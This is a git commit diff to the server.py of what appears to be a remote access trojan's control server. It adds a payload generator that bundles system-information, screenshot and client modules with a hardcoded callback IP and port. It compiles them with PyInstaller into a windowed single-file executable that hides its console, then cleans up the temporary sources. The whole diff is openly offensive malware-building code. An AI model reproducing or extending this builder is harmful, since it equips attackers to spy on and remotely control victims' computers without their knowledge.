3456f0980a00d49f3a9449292f6fc5ec0eeb5b19
hash3liZer <sheikhshameerkashif@protonmail.com>
2020-08-02 13:02:50 +0530

    Code generation facility

--- server.py
+++ server.py
@@ -7,6 +7,7 @@ import tabulate
 import signal
 import subprocess
 import argparse
+import shutil
 import threading
 import PyInstaller.__main__
 from datetime import datetime
@@ -72,6 +73,9 @@ class PULL:
 
     def print(self, mess):
         print(self.GREEN + "[" + self.UNDERLINE + "*" + self.END + self.GREEN + "] " + self.END + mess + self.END)
+
+    def function(self, mess):
+        print(self.BLUE + "[" + self.UNDERLINE + ":" + self.END + self.BLUE + "] " + self.END + mess + self.END)
 
     def error(self, mess):
         print(self.RED + "[" + self.UNDERLINE + "!" + self.END + self.RED + "] " + self.END + mess + self.END)
@@ -439,11 +443,131 @@ class INTERFACE(COMMCENTER):
     def close(self):
         self.SOCKET.close()
 
+class GENERATOR:
+
+    data = ""
+    flname = ""
+
+    def __init__(self, prs):
+        self.address = prs.address
+        self.port    = prs.port
+        self.output  = prs.output
+        self.pather  = self.get_path()
+        self.v_imports = self.get_imports()
+        self.v_consts  = self.get_consts()
+        self.v_sysinfo = self.get_sysinfo()
+        self.v_screenshot = self.get_screenshot()
+        self.v_client  = self.get_client()
+        self.v_main    = self.get_main()
+
+    def get_path(self):
+        dirname = os.path.dirname(__file__)
+        dirname = os.path.join(dirname, 'mods')
+        if os.path.isdir(dirname):
+            return dirname
+        else:
+            pull.exit("Files missing to generate the payload!")
+
+    def get_imports(self):
+        topen = os.path.join(self.pather, 'imports.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+
+    def get_consts(self):
+        data = "CONSTIP = \"%s\"\nCONSTPT = %i" % (self.address, self.port)
+        return data
+
+    def get_sysinfo(self):
+        topen = os.path.join(self.pather, 'sysinfo.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+    
+    def get_screenshot(self):
+        topen = os.path.join(self.pather, 'screenshot.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+
+    def get_client(self):
+        topen = os.path.join(self.pather, 'client.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+
+    def get_main(self):
+        topen = os.path.join(self.pather, 'main.py')
+        fl = open(topen)
+        data = fl.read()
+        fl.close()
+        return data
+
+    def tmp_dir(self):
+        dirname = os.path.dirname(__file__)
+        dirname = os.path.join(dirname, 'tmp')
+        
+        if not os.path.isdir(dirname):
+            os.mkdir(dirname)
+
+        fname   = os.path.join(dirname, 'cl.py')
+
+        return (dirname, fname, 'cl.py')
+
+    def generate(self):
+        time.sleep(2)
+        pull.function("Compiling modules ... ")
+        self.data = self.v_imports + "\n\n" + self.v_consts + "\n" + self.v_sysinfo + "\n\n" + \
+                self.v_screenshot + "\n\n" + self.v_client + "\n\n" + self.v_main
+        time.sleep(2)
+        pull.function("Generating one time code for binary ")
+        self.flname = self.tmp_dir()
+        fl = open(self.flname[1], 'w')
+        fl.write(self.data)
+        fl.close()
+        pull.print("Code generated successfully!")
+
+    def compile(self):
+        pull.function("Compiling generated code /\\")
+        counter = 1
+
+        t = threading.Thread(target=PyInstaller.__main__.run, args=([
+            '--name=%s' % os.path.basename(self.output),
+            '--onefile',
+            '--windowed',
+            '--log-level=ERROR',
+            '--distpath=%s' % os.path.dirname(self.output),
+            '--workpath=%s' % self.flname[0],
+            os.path.join(self.flname[0], self.flname[2])
+        ],),)
+        t.daemon = True
+        t.start()
+
+        while t.is_alive():
+            sys.stdout.write("\r" + pull.BLUE + "[" + pull.UNDERLINE + ":" + pull.END + pull.BLUE + "] " + pull.END + "Elapsed Time: %is" % (counter) + pull.END)
+            time.sleep(1)
+            counter += 1
+        
+        sys.stdout.write("\n")
+        pull.print("Compiled Successfully!")
+
+    def clean(self):
+        pull.function("Cleaning files and temporary codes")
+        shutil.rmtree(self.flname[0])
+        pull.print("File: " + self.output)
+
 class PARSER:
 
     def __init__(self, prs):
         self.address = self.v_address(prs.address)
         self.port    = self.v_port(prs.port)
+        self.mode    = self.v_mode(prs.mode)
+        if self.mode == "generate":
+            self.output = self.v_output(prs.output)
 
     def v_address(self, str):
         return str
@@ -457,25 +581,51 @@ class PARSER:
 
         return port
 
+    def v_mode(self, val):
+        if val:
+            if val == "bind" or val == "generate":
+                return val
+            else:
+                pull.exit("Invalid Syntax")
+        else:
+            pull.exit("Invalid Syntax!")
+
+    def v_output(self, val):
+        if val:
+            if os.path.isdir(os.path.dirname(val)):
+                return val
+            else:
+                pull.exit("Directory doesn't exist!") 
+        else:
+            pull.exit("You must provide an output Path!")
+
 def main():
     pull.logo()
 
     parser = argparse.ArgumentParser()
 
+    parser.add_argument('mode', help="Moder")
     parser.add_argument('-a', '--address', dest="address", default="0.0.0.0", type=str, help="Address to Bind to")
     parser.add_argument('-p', '--port'   , dest="port"   , default=0 , type=int, help="Port to Bind to")
     parser.add_argument('-o', '--output' , dest="output" , default="", type=str, help="Complete Path to Output File!")
-    parser.add_argument('--generate'     , dest="generate", default=False, action="store_true", help="Generate the Payload")
 
     parser = parser.parse_args()
 
     parser = PARSER(parser)
 
-    iface = INTERFACE(parser)
-    iface.bind()
-    iface.accept()
-    iface.launch()
-    iface.close()
+    if parser.mode == "bind":
+        iface = INTERFACE(parser)
+        iface.bind()
+        iface.accept()
+        iface.launch()
+        iface.close()
+    else:
+        pull.function("Starting Generator Mode!")
+        generator = GENERATOR(parser)
+        generator.generate()
+        generator.compile()
+        generator.clean()
+        pull.function("Done")
 
 if __name__ == "__main__":
     main()
